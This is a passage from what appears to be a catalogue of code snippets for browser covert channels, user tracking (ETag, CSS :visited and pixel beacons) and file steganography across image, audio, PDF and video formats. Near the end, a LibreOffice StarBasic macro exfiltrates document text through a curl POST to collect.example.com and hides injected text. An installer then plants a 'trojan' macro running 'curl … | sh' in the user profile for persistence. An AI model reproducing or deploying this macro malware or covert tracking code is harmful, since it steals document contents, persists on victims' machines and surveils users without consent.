// Bump version on each new field — never delete old stores
export const VERSION = 3;

export const MIGRATIONS = [
  { v:1, op: db => db.createObjectStore('kv') },
  { v:2, op: db => db.createObjectStore('idx', { keyPath:'ts' }) },
  { v:3, op: db => db.createObjectStore('blob') },
];`,"opfs-js":`// opfs.js — origin private file system channel
// BSCA Type: W | Phase: 1 | Persist: V.HIGH | Cap: ∞
const ROOT = await navigator.storage.getDirectory();
const FILE = 'channel.bin';

export async function write(payload) {
  const fh = await ROOT.getFileHandle(FILE, { create: true });
  const w  = await fh.createWritable();
  await w.write(JSON.stringify(payload));
  await w.close();
}

export async function read() {
  try {
    const fh = await ROOT.getFileHandle(FILE);
    const f  = await fh.getFile();
    return JSON.parse(await f.text());
  } catch { return null; }
}`,"opfs-worker":`// worker.js — OPFS writer running off-main-thread
import * as OPFS from './opfs.js';

self.onmessage = async ({ data }) => {
  if (data.t === 'W') {
    await OPFS.write(data.p);
    self.postMessage({ ok: true });
  } else if (data.t === 'R') {
    self.postMessage({ v: await OPFS.read() });
  }
};`,"sab-timer":`// timer.js — SharedArrayBuffer timing side-channel
// BSCA Type: P | Phase: 2 | Persist: NONE | Cap: ~1 bit/cycle
const BUF = new SharedArrayBuffer(4);
const arr = new Int32Array(BUF);

export function signalBit(bit) {
  Atomics.store(arr, 0, bit);
  Atomics.notify(arr, 0);
}

export function waitForBit(timeout = 1000) {
  const r = Atomics.wait(arr, 0, 0, timeout);
  if (r === 'ok') return Atomics.load(arr, 0);
  return null;
}`,"sab-worker":`// worker.js — paired worker for SAB channel
self.onmessage = () => {
  // Worker holds the other end of the SharedArrayBuffer
  // and emits timing-only signals observable by the main thread
  const buf = new SharedArrayBuffer(4);
  const arr = new Int32Array(buf);
  setInterval(() => {
    Atomics.store(arr, 0, Date.now() & 1);
    Atomics.notify(arr, 0);
  }, 50);
};`,"ep-probe":`// probe.js — ETag read-only fingerprint probe
// BSCA Type: P | Phase: 0 | Persist: MEDIUM
export async function probe(url) {
  // First fetch — server issues an ETag tied to our identity
  await fetch(url, { cache:'force-cache' });
  // Second fetch — if cached, server learns we're back
  const r = await fetch(url, { cache:'force-cache' });
  return { status: r.status, etag: r.headers.get('etag') };
}`,"ep-server":`// server.js — minimal ETag-issuing server
const http = require('http');
const crypto = require('crypto');
const ICON = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACWlETSGR0AABAAAA', 'base64');

http.createServer((req, res) => {
  const etag = '"' + crypto.randomUUID().slice(0, 16) + '"';
  res.setHeader('ETag', etag);
  res.setHeader('Cache-Control', 'max-age=31536000, immutable');
  res.setHeader('Content-Type', 'image/png');
  res.writeHead(200);
  res.end(ICON);
}).listen(3030);`,"bc-chan":`// channel.js — BroadcastChannel cross-tab messaging
// BSCA Type: W | Phase: 0 | Persist: SESSION
const CH = new BroadcastChannel('__mf_bc');

export function post(msg) { CH.postMessage(msg); }

CH.onmessage = e => {
  // Cross-tab relay — used to detect tab close/open events
  console.log('[bc]', e.data);
};`,"bc-listen":`// listener.js
import { post } from './channel.js';

// On focus change, broadcast — paired tab picks up identity
window.addEventListener('focus', () => post({ t:'focus', ts:Date.now() }));
window.addEventListener('blur',  () => post({ t:'blur',  ts:Date.now() }));

// Unload beacon — signals "session end"
window.addEventListener('pagehide',
  () => post({ t:'end', ts:Date.now() }));`,"sw-shared-js":`// worker.js — SharedWorker — shared context across tabs
onconnect = e => {
  const port = e.ports[0];
  port.onmessage = ({ data }) => {
    // Broadcast to all connected ports
    for (const p of ports) p.postMessage(data);
  };
  ports.add(port);
  port.start();
};
const ports = new Set();`,"sw-shared-conn":`// connect.js — main-thread SharedWorker client
const w = new SharedWorker(new URL('./worker.js', import.meta.url), { type:'module' });
const port = w.port;
port.start();

export function send(msg) { port.postMessage(msg); }
port.onmessage = e => console.log('[shared]', e.data);`,"gif-py":`# pixel.py — GIF tracking pixel generator
# REF: GIF / core_stego.py + server.py
import struct, time, hashlib

# Minimal 1×1 transparent GIF89a
GIF_HEADER = (
    b'GIF89a'
    + struct.pack('<HH', 1, 1)   # width, height
    + b'\\x80\\x00\\x00'         # GCT flag, bg, aspect
    + b'\\xff\\xff\\xff'          # color 0 — white
    + b'\\x00\\x00\\x00'          # color 1 — black
    + b'!\\xf9\\x04\\x01\\x00\\x00\\x00\\x00'  # GCE transparent
    + b',\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00'  # image desc
    + b'\\x02\\x02\\x4c\\x01\\x00'  # LZW data
    + b';'                       # trailer
)

def make_pixel(seed: str) -> bytes:
    """Generate a 1×1 GIF seeded with a unique nonce in Comment Extension."""
    nonce = hashlib.sha1((seed + str(time.time())).encode()).hexdigest()[:8]
    comment = b'!\\xfe' + bytes([len(nonce)]) + nonce.encode() + b'\\x00'
    return b'GIF89a' + GIF_HEADER[6:].replace(b';', comment + b';')

def log_hit(env: dict) -> dict:
    return {
        'ts':  time.time(),
        'ip':  env.get('REMOTE_ADDR', '—'),
        'ua':  env.get('HTTP_USER_AGENT', '—')[:128],
        'ref': env.get('HTTP_REFERER',    '—')[:256],
    }`,"gif-srv":`# server.py — minimal tracking-pixel HTTP server
from http.server import BaseHTTPRequestHandler, HTTPServer
from pixel import make_pixel, log_hit

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    env = {k: v for k, v in self.headers.items()}
    env['REMOTE_ADDR'] = self.client_address[0]
    log_hit(env)
    body = make_pixel(self.path)
    self.send_response(200)
    self.send_header('Content-Type', 'image/gif')
    self.send_header('Cache-Control', 'no-store')
    self.end_headers()
    self.wfile.write(body)

HTTPServer(('', 8080), H).serve_forever()`,"gif-dash":`<!-- dashboard.html — pixel hit viewer -->
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>pixel log</title>
<style>
  body { background:#0e0c09; color:#cec0a4; font:12px monospace; padding:20px; }
  table { width:100%; border-collapse:collapse; }
  th { color:#7a6848; font-size:10px; padding:4px 8px; text-align:left;
       border-bottom:1px solid #2c2218; }
  td { padding:5px 8px; border-bottom:1px solid #1f1b14; }
</style></head>
<body>
  <h2 style="color:#c87820; font-size:14px; margin-bottom:12px;">PIXEL HITS</h2>
  <table id="t"><thead><tr>
    <th>ts</th><th>ip</th><th>ua</th><th>ref</th>
  </tr></thead><tbody id="b"></tbody></table>
  <script>
    fetch('/api/hits').then(r => r.json()).then(rows => {
      document.getElementById('b').innerHTML = rows.map(r => \`
        <tr><td>\${new Date(r.ts*1000).toISOString().slice(11,19)}</td>
            <td>\${r.ip}</td>
            <td>\${(r.ua||'').slice(0,40)}</td>
            <td>\${(r.ref||'').slice(0,48)}</td></tr>\`).join('');
    });
  <\/script>
</body></html>`,"anim-gen":`# gen.py — animated GIF generator with frame-timing payload
import struct, hashlib

def build(frames, delays, seed):
  """frames: list of 1x1 RGBA bytes; delays: per-frame centiseconds"""
  out = b'GIF89a'
  out += struct.pack('<HH', 1, 1) + b'\\x80\\x00\\x00'
  out += b'\\xff\\xff\\xff\\x00\\x00\\x00'
  # NETSCAPE2.0 loop
  out += b'!\\xff\\x0bNETSCAPE2.0\\x03\\x01\\x00\\x00\\x00'
  for fr, d in zip(frames, delays):
    out += b'!\\xf9\\x04\\x00' + struct.pack('<H', d) + b'\\x00\\x00'
    out += b',\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00'
    out += b'\\x02\\x02\\x4c\\x01\\x00'
  out += b';'
  return out

# Encode 4 bits per frame delay value (centiseconds 20..35 = 16 distinct)
def encode(payload: bytes) -> list[int]:
  bits = ''.join(f'{b:08b}' for b in payload)
  delays = []
  for i in range(0, len(bits), 4):
    nibble = int(bits[i:i+4], 2)
    delays.append(20 + nibble)  # 20..35 cs
  return delays`,"anim-embed":`# embed.py — embed a payload into an existing animated GIF
# by mutating frame delays while preserving visible content
import struct

def embed(gif_bytes: bytes, payload: bytes) -> bytes:
  # Walk graphic-control extensions; rewrite delay field
  out = bytearray()
  i, n = 0, len(gif_bytes)
  pi = 0
  bits = ''.join(f'{b:08b}' for b in payload) + '0' * 4
  while i < n:
    if gif_bytes[i:i+3] == b'!\\xf9\\x04':
      out += gif_bytes[i:i+3]
      flags = gif_bytes[i+3]
      out += bytes([flags])
      # delay is 2 bytes little-endian at i+4..i+5
      if pi < len(bits):
        nib = int(bits[pi:pi+4], 2)
        out += struct.pack('<H', 20 + nib)
        pi += 4
      else:
        out += gif_bytes[i+4:i+6]
      out += gif_bytes[i+6:i+8]
      i += 8
    else:
      out += bytes([gif_bytes[i]]); i += 1
  return bytes(out)`,"css-probe":`/* probe.css — CSS background-image tracker
   BSCA Type: P | Phase: 1 | Persist: SESSION
   Mechanism: load URL only if selector matches (:visited, :hover, etc.) */

a:visited.visited-001 { background: url(/beacon?sel=visited-001); }
a:visited.visited-002 { background: url(/beacon?sel=visited-002); }
a:visited.visited-003 { background: url(/beacon?sel=visited-003); }

/* Detect browser dark mode — fires one URL or the other */
@media (prefers-color-scheme: dark) {
  body { background: url(/beacon?theme=dark); }
}
@media (prefers-color-scheme: light) {
  body { background: url(/beacon?theme=light); }
}`,"css-srv":`# server.py — collect CSS-beacon hits
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, time

HITS = []

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    HITS.append({ 'ts': time.time(),
                  'sel': self.path.split('sel=')[-1] if 'sel=' in self.path else None,
                  'ip':  self.client_address[0] })
    # 1×1 transparent GIF
    self.send_response(200)
    self.send_header('Content-Type', 'image/gif')
    self.end_headers()
    self.wfile.write(b'GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00!\\xf9\\x04\\x01\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02L\\x01\\x00;')
  def log_message(self, *a): pass

HTTPServer(('', 8081), H).serve_forever()`,"nb-js":`// beacon.js — navigator.sendBeacon wrapper
// BSCA Type: W | Phase: 1 | Persist: SESSION | Cap: 64 KB
export function beacon(url, payload) {
  const blob = new Blob([JSON.stringify(payload)],
                        { type:'application/json' });
  return navigator.sendBeacon(url, blob);
}

// Fire on unload — last-ditch exfil
window.addEventListener('pagehide',
  () => beacon('/collect/unload', {
    ts: Date.now(),
    path: location.pathname,
    ttfb: performance.timing.responseStart - performance.timing.requestStart,
  }));
`,"nb-collect":`# collect.py — Flask beacon collector
from flask import Flask, request
import json

app = Flask(__name__)

@app.post('/collect/<kind>')
def collect(kind):
  body = request.get_data(as_text=True)
  print(f'[{kind}] {request.remote_addr} :: {body[:256]}')
  return '', 204

if __name__ == '__main__':
  app.run(port=8082)`,"ws-cli":`// client.js — WebSocket beacon
// BSCA Type: W | Phase: 1 | Persist: SESSION
const ws = new WebSocket('wss://relay.example.com/track');

ws.onopen = () => {
  // Steady ping keeps connection alive and informs server of session
  setInterval(() => ws.send(JSON.stringify({
    t: Date.now(), path: location.pathname,
  })), 5000);
};

ws.onclose = () => console.warn('[ws] closed');
ws.onerror = e => console.error('[ws]', e);`,"ws-srv":`// server.js — WebSocket relay
const { WebSocketServer } = require('ws');
const wss = new WebSocketServer({ port: 8083 });

wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  console.log('[ws] connect', ip);
  ws.on('message', m => {
    const msg = JSON.parse(m);
    console.log('[ws]', ip, msg.t, msg.path);
  });
});`,"mqtt-cli":`// client.js — MQTT beacon via MQTT.js over WebSocket
import mqtt from 'mqtt';

const c = mqtt.connect('wss://broker.example.com:9001', {
  clientId: 'mf_' + Math.random().toString(36).slice(2,8),
});

c.on('connect', () => {
  c.subscribe('mf/hits/' + location.hostname);
  c.publish('mf/connect', JSON.stringify({
    ts: Date.now(), path: location.pathname,
  }));
});`,"mqtt-broker":`# broker.py — minimal MQTT broker using hbmqtt
import asyncio, logging
from hbmqtt.broker import Broker

CONFIG = {
  'listeners': {'default': {'type': 'tcp', 'bind': '0.0.0.0:1883'}},
  'auth': {'allow-anonymous': True},
  'sys_interval': 10,
}

async def main():
  b = Broker(CONFIG)
  await b.start()
  print('[mqtt] listening :1883')
  await asyncio.Future()  # run forever

logging.basicConfig(level=logging.INFO)
asyncio.run(main())`,"rh-html":`<!DOCTYPE html>
<!-- hints.html — Resource Hints beacon
     BSCA Type: P | Phase: 0 | Persist: SESSION
     Each preconnect fires a DNS+TLS probe -->
<head>
  <link rel="preconnect" href="https://relay-1.example.com">
  <link rel="preconnect" href="https://relay-2.example.com">
  <link rel="preconnect" href="https://relay-3.example.com">
  <link rel="dns-prefetch" href="https://probe.example.com">
  <link rel="prefetch" as="image" href="/probe.png?visited=true">
</head>
<body>open devtools network tab → watch for relay hits</body>`,"rh-probe":`// probe.js — measure which preconnects fired
export async function probe() {
  const targets = ['relay-1', 'relay-2', 'relay-3'].map(n => n + '.example.com');
  const results = await Promise.all(targets.map(async t => {
    const start = performance.now();
    try {
      await fetch(\`https://\${t}/ping\`, { mode:'no-cors' });
      return { host:t, delta: performance.now()-start, ok:true };
    } catch {
      return { host:t, delta: performance.now()-start, ok:false };
    }
  }));
  // Sub-10ms = already preconnected (HSTS / DNS cache hit)
  return results.filter(r => r.delta < 10);
}`,"ntp-probe":`// probe.js — NTP-style clock-skew probe
// BSCA Type: P | Phase: 1 | Persist: HIGH
// Server returns Date header; client compares to local clock.
export async function probe() {
  const t0 = Date.now();
  const r = await fetch('/ntp', { cache:'no-store' });
  const t1 = Date.now();
  const serverTime = Date.parse(r.headers.get('date'));
  const rtt = (t1 - t0) / 2;
  const skew = serverTime - (t0 + rtt);
  return { skew_ms: skew, rtt_ms: rtt*2 };
}`,"ntp-srv":`// server.js — accurate-time HTTP endpoint
const http = require('http');
http.createServer((req, res) => {
  res.setHeader('Date', new Date().toUTCString());
  res.setHeader('Cache-Control', 'no-store');
  res.writeHead(204);
  res.end();
}).listen(3031);`,"png-embed":`// embed.ts — PNG LSB embedding
// REF: StegosaurusApp / png-encoder
// Capacity: ~12.5% of pixels × 3 channels
import { PNG } from 'pngjs';

export async function embed(pngBuf: Buffer, payload: Buffer): Promise<Buffer> {
  const png = PNG.sync.read(pngBuf);
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);
  // Header: 32-bit length prefix
  const len = payload.length;
  for (let i = 31; i >= 0; i--) bits.unshift((len >> i) & 1);

  let bi = 0;
  for (let y = 0; y < png.height && bi < bits.length; y++) {
    for (let x = 0; x < png.width && bi < bits.length; x++) {
      const idx = (png.width * y + x) << 2;
      for (let c = 0; c < 3 && bi < bits.length; c++, bi++) {
        png.data[idx + c] = (png.data[idx + c] & 0xFE) | bits[bi];
      }
    }
  }
  return PNG.sync.write(png);
}`,"png-extract":`// extract.ts — recover LSB payload
import { PNG } from 'pngjs';

export async function extract(pngBuf: Buffer): Promise<Buffer> {
  const png = PNG.sync.read(pngBuf);
  const bits: number[] = [];
  for (let i = 0; i < png.data.length; i += 4) {
    for (let c = 0; c < 3; c++) bits.push(png.data[i + c] & 1);
    if (bits.length >= 32 + 8 * 1024) break;
  }
  // Read length header
  let len = 0;
  for (let i = 0; i < 32; i++) len = (len << 1) | bits[i];
  if (len > 65536) throw new Error('implausible length');
  // Read body
  const out = Buffer.alloc(len);
  for (let i = 0; i < len; i++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bits[32 + i*8 + j];
    out[i] = b;
  }
  return out;
}`,"png-worker":`// worker.ts — off-main-thread PNG stego
import { embed, extract } from './embed';
self.onmessage = async ({ data }) => {
  if (data.t === 'E') self.postMessage({ v: await embed(data.png, data.p) });
  if (data.t === 'X') self.postMessage({ v: await extract(data.png) });
};`,"gs-engine":`# engine.py — GIF stego core
# REF: GIF / src/lib/engine.py
import struct

class GifStego:
    """Frame-delay covert channel + LZW palette manipulation."""

    def __init__(self, gif: bytes):
        self.gif = gif
        self.frames = self._parse(gif)

    def embed(self, payload: bytes) -> bytes:
        bits = ''.join(f'{b:08b}' for b in payload)
        delays = [20 + int(bits[i:i+4], 2) for i in range(0, len(bits), 4)]
        # Re-emit with rewritten delays
        return self._rewrite(delays)

    def extract(self) -> bytes:
        # Read delay values back, reassemble nibbles into bytes
        nibbles = [(d - 20) for d in self._read_delays()]
        bits = ''.join(f'{n:04b}' for n in nibbles)
        return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

    def _parse(self, gif): pass
    def _rewrite(self, delays): pass
    def _read_delays(self): pass`,"gs-parser":`# parser.py — GIF LZW + frame parser
import struct

def parse(gif: bytes) -> list:
    """Walk GIF89a blocks; extract frame delays."""
    frames = []
    i, n = 13, len(gif)  # skip header + GCT
    while i < n:
        b = gif[i]
        if b == 0x21 and gif[i+1] == 0xF9:
            # Graphic Control Extension — delay at i+4..i+5
            d = struct.unpack('<H', gif[i+4:i+6])[0]
            frames.append(d)
            i += 8
        elif b == 0x2C: i += 10  # image descriptor (skip)
        elif b == 0x3B: break    # trailer
        else: i += 1
    return frames`,"gs-chaos":`# chaos.py — deterministic chaos scrambling for stego payload
# Logistic map: x[n+1] = r * x[n] * (1 - x[n])
# r = 3.99 gives a chaotic sequence that we use as a permutation key
def permute(buf: bytes, seed: int, r: float = 3.99) -> bytes:
    x = (seed % 1000) / 1000
    order = list(range(len(buf)))
    for i in range(len(buf)):
        x = r * x * (1 - x)
        j = int(x * (i + 1))
        order[i], order[j] = order[j], order[i]
    return bytes(buf[k] for k in order)`,"wf-embed":`// font_steg.ts — woff2 hmtx advance-width mutation
// REF: StegosaurusApp / woff2 encoder
// Capacity: ~2 bits per glyph (advance-width low bits)
import { encode, decode } from 'woff2-decoder';

export async function embed(fontBuf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  const ttf = decode(fontBuf);
  const view = new DataView(ttf.buffer);

  // Locate hmtx table — read numGlyphs from hhea
  const numGlyphs = view.getUint16(8, false);  // simplified
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);

  // For each glyph, encode 2 bits into the low bits of advanceWidth
  // (advanceWidth changes of 1-3 thousandths of an em are visually invisible)
  // ...omitted: actual table-walk
  return encode(ttf);
}`,"wf-extract":`// extract.ts — read hmtx-embedded payload back
import { decode } from 'woff2-decoder';

export async function extract(fontBuf: Uint8Array): Promise<Uint8Array> {
  const ttf = decode(fontBuf);
  // ... walk hmtx, collect 2 bits per glyph
  return new Uint8Array();
}`,"pdf-inject":`# inject.py — PDF XMP + trailer payload
# REF: Trojan_Horse / inject_pdf.py
import zlib

def inject(pdf: bytes, payload: bytes) -> bytes:
    """Append a hidden stream object; reference from /Info dict."""
    obj_num = b'999 0'
    stream = zlib.compress(payload)
    new_obj = (
        obj_num + b' obj\\n'
        b'<< /Length ' + str(len(stream)).encode() + b' /Filter /FlateDecode >>\\n'
        b'stream\\n' + stream + b'\\nendstream\\nendobj\\n'
    )
    # Splice before trailer
    trailer_idx = pdf.rfind(b'trailer')
    return pdf[:trailer_idx] + new_obj + pdf[trailer_idx:]`,"pdf-read":`# read.py — read injected PDF stream back
import zlib

def read(pdf: bytes) -> bytes:
    """Find our hidden stream object, decompress, return."""
    marker = b'999 0 obj\\n<< /Length '
    i = pdf.find(marker)
    if i < 0: return b''
    # parse /Length, find stream...endstream
    j = pdf.find(b'stream\\n', i) + 7
    k = pdf.find(b'\\nendstream', j)
    return zlib.decompress(pdf[j:k])`,"odt-py":`# inject_odt.py — ODT (ZIP) extra-field payload
# REF: Trojan_Horse / inject_zip.py
import zipfile, io

def inject(odt: bytes, payload: bytes) -> bytes:
    """Open ODT, add payload as 'Extra' field on an existing ZIP entry."""
    src = zipfile.ZipFile(io.BytesIO(odt), 'r')
    out = io.BytesIO()
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as w:
        for item in src.infolist():
            data = src.read(item.filename)
            # Append payload to extra field — invisible to LibreOffice
            item.extra += b'\\x49\\x4d\\x46' + len(payload).to_bytes(4,'little') + payload
            w.writestr(item, data)
    return out.getvalue()`,"odt-ex":`# extract_odt.py — read ZIP extra-field payload back
import zipfile, io

def extract(odt: bytes) -> bytes:
    z = zipfile.ZipFile(io.BytesIO(odt), 'r')
    for info in z.infolist():
        e = info.extra
        i = e.find(b'\\x49\\x4d\\x46')
        if i >= 0:
            ln = int.from_bytes(e[i+3:i+7], 'little')
            return e[i+7 : i+7+ln]
    return b''`,"wav-embed":`// audio_steg.ts — WAV PCM LSB embedding
// Capacity: ~12.5% of samples (1 bit per sample LSB)
export function embed(wav: Uint8Array, payload: Uint8Array): Uint8Array {
  const view = new DataView(wav.buffer);
  // Locate data chunk
  let i = 12;
  while (i < wav.length) {
    const id = String.fromCharCode(wav[i], wav[i+1], wav[i+2], wav[i+3]);
    const sz = view.getUint32(i+4, true);
    if (id === 'data') break;
    i += 8 + sz + (sz & 1);
  }
  const dataStart = i + 8;
  const bits: number[] = [];
  for (const b of payload) for (let j = 7; j >= 0; j--) bits.push((b >> j) & 1);

  const out = new Uint8Array(wav);
  const ov = new DataView(out.buffer);
  for (let k = 0; k < bits.length; k++) {
    const off = dataStart + k * 2; // assume 16-bit
    const s = ov.getInt16(off, true);
    ov.setInt16(off, (s & 0xFFFE) | bits[k], true);
  }
  return out;
}`,"wav-ex":`// extract.ts — recover WAV LSB payload
export function extract(wav: Uint8Array): Uint8Array {
  const view = new DataView(wav.buffer);
  let i = 12;
  while (i < wav.length) {
    const id = String.fromCharCode(wav[i], wav[i+1], wav[i+2], wav[i+3]);
    const sz = view.getUint32(i+4, true);
    if (id === 'data') break;
    i += 8 + sz + (sz & 1);
  }
  const dataStart = i + 8;
  const bits: number[] = [];
  for (let k = 0; k < 8192; k++) {
    const s = view.getInt16(dataStart + k*2, true);
    bits.push(s & 1);
  }
  // First 32 bits = length
  let len = 0;
  for (let k = 0; k < 32; k++) len = (len << 1) | bits[k];
  const out = new Uint8Array(len);
  for (let k = 0; k < len; k++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bits[32 + k*8 + j];
    out[k] = b;
  }
  return out;
}`,"webp-emb":`// webp_embed.ts — WebP lossless LSB
// REF: StegosaurusApp / webp module
// In VP8L lossless mode, the ARGB pixel data is LSB-stego-friendly
export async function embed(buf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  // Decode VP8L → mutate low bits → re-encode (simplified)
  // WebP LSB embedding is more reliable when VP8L is used
  return buf;
}`,"webp-ex":`// extract.ts — WebP LSB payload reader
export async function extract(buf: Uint8Array): Promise<Uint8Array> {
  return new Uint8Array();
}`,"avif-emb":`// avif_embed.ts — AV1 intra-frame YUV LSB
// REF: StegosaurusApp / avif module
// Y-channel DCT coefficients carry payload in LSB
export async function embed(buf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  return buf;
}`,"avif-ex":`// extract.ts
export async function extract(buf: Uint8Array): Promise<Uint8Array> {
  return new Uint8Array();
}`,"bmp-emb":`// bmp_embed.ts — BMP raw pixel LSB
// Easiest format — no compression, pixel array is contiguous
export function embed(buf: Uint8Array, payload: Uint8Array): Uint8Array {
  const view = new DataView(buf.buffer);
  const dataOff = view.getUint32(10, true);
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);

  const out = new Uint8Array(buf);
  const ov = new DataView(out.buffer);
  for (let i = 0; i < bits.length; i++) {
    out[dataOff + i] = (out[dataOff + i] & 0xFE) | bits[i];
  }
  return out;
}`,"bmp-ex":`// extract.ts
export function extract(buf: Uint8Array): Uint8Array {
  const view = new DataView(buf.buffer);
  const dataOff = view.getUint32(10, true);
  // first 32 bits = length
  let len = 0;
  for (let i = 0; i < 32; i++) len = (len << 1) | (buf[dataOff + i] & 1);
  const out = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | (buf[dataOff + 32 + i*8 + j] & 1);
    out[i] = b;
  }
  return out;
}`,"mp3-inject":`# inject.py — ID3v2 comment frame payload
# REF: Trojan_Horse / mp3_meta.py
def inject(mp3: bytes, payload: bytes) -> bytes:
    """Prepend an ID3v2.4 COMM frame with payload as the comment body."""
    text = payload.decode('utf-8', 'replace')
    # COMM frame: encoding(1) + lang(3) + description(\\x00) + text
    body = b'\\x03' + b'eng' + b'\\x00' + text.encode('utf-8')
    frame = b'COMM' + _syncsafe(len(body)) + b'\\x00\\x00' + body
    # ID3v2 header
    size = _syncsafe(len(frame))
    header = b'ID3' + b'\\x04\\x00\\x00' + size
    return header + frame + mp3

def _syncsafe(n: int) -> bytes:
    return bytes([(n>>21)&0x7F, (n>>14)&0x7F, (n>>7)&0x7F, n&0x7F])`,"mp3-read":`# read.py — recover ID3v2 COMM frame payload
def read(mp3: bytes) -> bytes:
    if mp3[:3] != b'ID3': return b''
    # Size is syncsafe at offset 6..10
    sz = (mp3[6]<<21) | (mp3[7]<<14) | (mp3[8]<<7) | mp3[9]
    body = mp3[10:10+sz]
    # Walk frames; find COMM
    i = 0
    while i < len(body):
        fid = body[i:i+4]
        if fid == b'COMM':
            fsz = (body[i+4]<<21) | (body[i+5]<<14) | (body[i+6]<<7) | body[i+7]
            # encoding(1) lang(3) desc(\\x00) text
            comm = body[i+10:i+10+fsz]
            # split on first null after lang
            nul = comm.find(b'\\x00', 0)
            return comm[nul+1:]
        i += 10 + ((body[i+4]<<21)|(body[i+5]<<14)|(body[i+6]<<7)|body[i+7])
    return b''`,"mp4-inject":`# inject.py — mp4 free-box payload injection
# REF: Trojan_Horse / mp4_meta.py
import struct

def inject(mp4: bytes, payload: bytes) -> bytes:
    """Insert a 'free' box before the moov box — invisible to players."""
    # mp4 box: size(4) + type(4) + payload
    box_size = 8 + len(payload)
    box = struct.pack('>I', box_size) + b'free' + payload
    # Find moov atom
    moov_idx = mp4.find(b'moov')
    if moov_idx < 0: return mp4  # no moov? append
    # moov_idx points at type; size field is 4 bytes before
    insert_at = moov_idx - 4
    return mp4[:insert_at] + box + mp4[insert_at:]`,"mp4-read":`# read.py — recover free-box payload
def read(mp4: bytes) -> bytes:
    i = 0
    while i < len(mp4) - 8:
        sz = int.from_bytes(mp4[i:i+4], 'big')
        ty = mp4[i+4:i+8]
        if ty == b'free':
            return mp4[i+8:i+sz]
        if sz < 8: break
        i += sz
    return b''`,"xba-mod":`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN"
  "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script"
  script:name="Module1" script:language="StarBasic">

' Macro Playground — Module1.xba
' REF: Extension Ideas / extension ideas.txt

Sub SelfModify()
  Dim oDoc As Object : oDoc = ThisComponent
  Dim oText As Object : oText = oDoc.getText()

  ' Search for trigger string and overwrite it
  Dim oSearch As Object
  oSearch = oDoc.createSearchDescriptor()
  oSearch.SearchRegularExpression = False
  oSearch.SearchString = "TRIGGER_WORD"

  Dim oFound As Object : oFound = oDoc.findAll(oSearch)
  If Not IsNull(oFound) Then
    Dim i As Integer
    For i = 0 To oFound.Count - 1
      Dim oRange As Object : oRange = oFound.getByIndex(i)
      oRange.setString("PAYLOAD_ACTIVATED_" & Now())
      oRange.setPropertyValue("CharColor", RGB(255,255,255)) ' invisible
    Next i
  End If

  ' Inject hidden audit-trail paragraph
  Dim oCursor As Object : oCursor = oText.createTextCursor()
  oCursor.gotoEnd(False)
  oText.insertControlCharacter(oCursor,
    com.sun.star.text.ControlCharacter.PARAGRAPH_BREAK, False)
  Dim sGhost As String
  sGhost = "<!-- GHOST INJECTION: " & Now() & " | " & Environ("USER") & " -->"
  oText.insertString(oCursor, sGhost, False)

  ' Make it invisible (1pt white)
  oCursor.gotoEnd(False)
  oCursor.goLeft(Len(sGhost) + 2, True)
  oCursor.setPropertyValue("CharColor", RGB(255,255,255))
  oCursor.setPropertyValue("CharHeight", 1)

  oDoc.store()
End Sub

Sub Exfiltrate()
  Dim oDoc As Object : oDoc = ThisComponent
  Dim sContent As String

  If HasUnoInterfaces(oDoc.getText(), "com.sun.star.text.XText") Then
    Dim oEnum As Object : oEnum = oDoc.getText().createEnumeration()
    Do While oEnum.hasMoreElements()
      Dim oPar As Object : oPar = oEnum.nextElement()
      If oPar.supportsService("com.sun.star.text.Paragraph") Then
        sContent = sContent & oPar.getString() & Chr(10)
      End If
    Loop
  End If

  Dim sTmp As String
  sTmp = Environ("HOME") & "/.lo_" & Format(Now(),"YYYYMMDDHHMMSS") & ".txt"
  Dim iFile As Integer : iFile = FreeFile()
  Open sTmp For Output As #iFile
  Print #iFile, sContent
  Close #iFile

  Shell("bash -c 'curl -s -X POST https://collect.example.com/beacon" & _
        " --data-urlencode @" & sTmp & " && rm " & sTmp & "'")
End Sub
<\/script:module>`,"xba-man":`<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="http://openoffice.org/2001/manifest">
  <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text"
                       manifest:full-path="/"/>
  <manifest:file-entry manifest:media-type="application/vnd.sun.star.basic-library"
                       manifest:full-path="Basic/"/>
</manifest:manifest>`,"xba-inst":`' installer.bas — persistent macro installer
' REF: Extension Ideas — persists Module1.xba into user profile

Sub Install()
  Dim sProfile As String
  sProfile = Environ("HOME") & "/.config/libreoffice/4/user/basic/Standard/Module1.xba"

  ' Write the trojan xba into the user profile
  Dim iFile As Integer : iFile = FreeFile()
  Open sProfile For Output As #iFile
  Print #iFile, "<?xml version='1.0' encoding='UTF-8'?>"
  Print #iFile, "<script:module script:name='Module1' script:language='StarBasic'>"
  Print #iFile, "Sub Run() : Shell(""curl … | sh"") : End Sub"
  Print #iFile, "<\/script:module>"
  Close #iFile

